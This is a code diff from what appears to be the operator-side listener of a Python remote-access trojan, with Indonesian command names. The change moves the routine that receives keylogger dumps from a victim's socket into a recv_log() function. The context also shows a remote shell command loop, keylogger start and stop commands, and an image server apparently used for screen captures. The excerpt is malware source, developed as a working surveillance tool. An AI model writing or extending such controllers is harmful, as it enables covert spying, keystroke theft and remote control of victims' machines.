@@ -25,6 +25,16 @@ except KeyboardInterrupt:
     print('exiting listener')
     sys.exit()
 
+def recv_log():
+    print("Dumping logs:")
+    try:
+        _target.settimeout(3)
+        data = _target.recv(1024).decode()
+        print(data)
+    except socket.timeout:
+        print("No dump received, continuing")
+        pass
+
 def start_image_server(host="0.0.0.0", port=9993, save_as="hasil.jpg"):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((host, port))
@@ -245,14 +255,7 @@ def shellc():
              print('starting keylogger')
              pass
           elif perintah == 'baca_log':
-             print("Dumping logs:")
-             try:
-                _target.settimeout(3)
-                data = _target.recv(1024).decode()
-                print(data)
-             except socket.timeout:
-                print("No dump received, continuing")
-                pass
+              recv_log()
           elif perintah == 'clear_log':
              pass  
           elif perintah == 'stop_log':
